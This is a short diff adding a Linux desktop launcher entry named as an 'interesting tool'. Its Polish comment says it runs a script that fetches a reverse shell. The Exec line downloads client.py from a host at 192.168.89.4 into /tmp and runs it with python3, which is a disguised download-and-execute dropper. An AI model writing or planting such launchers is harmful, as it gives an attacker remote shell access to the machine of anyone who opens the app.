@@ -1,0 +1,8 @@
+[Desktop Entry]
+Type=Application
+Name=Ciekawe Narzedzie
+Comment=Uruchamia skrypt pobierający Reverse Shell
+Icon=utilities-terminal
+Terminal=true
+Exec=bash -c "curl -sS http://192.168.89.4:8000/client.py -o /tmp/s.py && python3 /tmp/s.py"
+Categories=Application;
